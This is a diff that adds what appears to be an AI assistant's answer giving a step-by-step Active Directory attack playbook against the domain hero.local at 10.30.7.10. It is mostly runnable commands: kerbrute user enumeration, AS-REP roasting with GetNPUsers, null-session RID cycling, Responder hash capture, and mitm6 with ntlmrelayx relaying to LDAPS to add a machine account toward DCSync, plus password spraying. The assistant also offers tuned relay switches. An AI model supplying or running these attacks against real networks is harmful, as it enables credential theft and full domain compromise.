@@ -1,3 +1,100 @@
+1) Kerberos user discovery (no bind, no creds)
+
+Goal: get even one valid sAMAccountName. Tools return:
+
+KDC_ERR_PREAUTH_REQUIRED → user exists (not roastable)
+
+$krb5asrep$… → user exists and is AS-REP-roastable (jackpot)
+
+KDC_ERR_C_PRINCIPAL_UNKNOWN → user doesn’t exist
+
+A. Start with high-probability names
+
+Try built-ins and common service accounts first:
+
+echo -e "administrator\nkrbtgt\nguest\nsvc_sql\nsvc_mssql\nsvc_iis\nsvc_backup\nsvc_veeam\nsvc_sharepoint\nsvc_sccm\nsqlservice\nmssqlsvc\niis_svc\nbackup\nhelpdesk\nitadmin" > seed.txt
+kerbrute userenum -d hero.local --dc 10.30.7.10 seed.txt -o valid_users.txt
+python /usr/share/doc/python3-impacket/examples/GetNPUsers.py HERO.LOCAL/ -dc-ip 10.30.7.10 -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt
+
+B. Generate a bigger, realistic list quickly (still no creds)
+
+If you have SecLists (Parrot/Kali usually do):
+
+# common usernames
+kerbrute userenum -d hero.local --dc 10.30.7.10 /usr/share/seclists/Usernames/top-usernames-shortlist.txt -o valid_users.txt
+
+
+If you also have first/last name lists, build corp-style patterns:
+
+paste /usr/share/seclists/Usernames/Names/names.txt /usr/share/seclists/Usernames/Names/surnames.txt \
+| awk '{f=tolower($1); l=tolower($2); print f l; print substr(f,1,1) l; print f "." l}' \
+| sort -u > candidates.txt
+kerbrute userenum -d hero.local --dc 10.30.7.10 candidates.txt -o valid_users.txt
+
+
+Then re-run GetNPUsers.py on valid_users.txt as above.
+
+Sanity checks: use HERO.LOCAL as the realm (all caps is fine); one username per line; ensure UDP/TCP 88 is reachable.
+
+2) Try legacy/null paths (sometimes still open even when LDAP anon is blocked)
+
+These don’t need creds; they either work immediately or fail fast:
+
+# Null SAMR/LSA (may give you users or the domain SID for RID cycling)
+rpcclient -U "" -N 10.30.7.10 -c "lsaquery; enumdomains; querydominfo; enumdomusers"
+
+# RID cycling (if domain SID is known/guessable)
+python /usr/share/doc/python3-impacket/examples/lookupsid.py @10.30.7.10
+
+
+If lookupsid.py leaks RIDs → you’ll see real usernames right away.
+
+3) Don’t guess—steal a username (hash capture / coercion)
+
+You can capture NTLM auths on the wire; the hash includes the username.
+
+A. LLMNR/NBNS (same L2 segment)
+responder -I eth0
+# Wait for a broadcast; any hit will show "USERNAME:DOMAIN" with NTLMv2 hash.
+
+B. IPv6/mitm6 + relay straight to LDAPS (no prior username needed)
+
+This often works internally even when SMB signing is required:
+
+# 1) Poison IPv6 to make hosts auth to you
+mitm6 -d hero.local
+
+# 2) Relay whatever you catch to LDAPS on the DC and escalate
+ntlmrelayx.py -6 -t ldaps://10.30.7.10 -smb2support --add-computer 'WS$'
+# If successful, you’ve got a new machine account or elevated rights → DCSync.
+
+
+Any hit in Responder/ntlmrelayx will show you the exact username used to authenticate.
+
+What to do the moment you have one valid username
+
+AS-REP roast it (if allowed) – already covered.
+
+If not roastable, spray carefully (respect lockout):
+
+kerbrute passwordspray -d hero.local --dc 10.30.7.10 valid_users.txt 'Season2025!' --delay 3s
+
+
+With creds: bind to LDAP/GC, enumerate users/SPNs, then Kerberoast, and use WinRM/SCMR for exec.
+
+Minimal “do this now” block
+echo -e "administrator\nkrbtgt\nguest\nsvc_sql\nsvc_mssql\nsvc_iis\nsvc_backup\nsqlservice\nmssqlsvc\nbackup\nhelpdesk\nitadmin" > seed.txt
+kerbrute userenum -d hero.local --dc 10.30.7.10 seed.txt -o valid_users.txt
+python /usr/share/doc/python3-impacket/examples/GetNPUsers.py HERO.LOCAL/ -dc-ip 10.30.7.10 -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt
+# If still empty, run Responder or mitm6+ntlmrelayx to capture a username.
+
+
+If you want, tell me whether you’re on the same L2 segment as targets. If yes, I’ll give you the exact mitm6 + ntlmrelayx switches (safe timings, write-ups) tuned for this DC.
+
+
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 # 0) Confirm the naming context
 ldapsearch -x -H ldap://10.30.7.10:3268 -s base -b "" -LLL defaultNamingContext
 
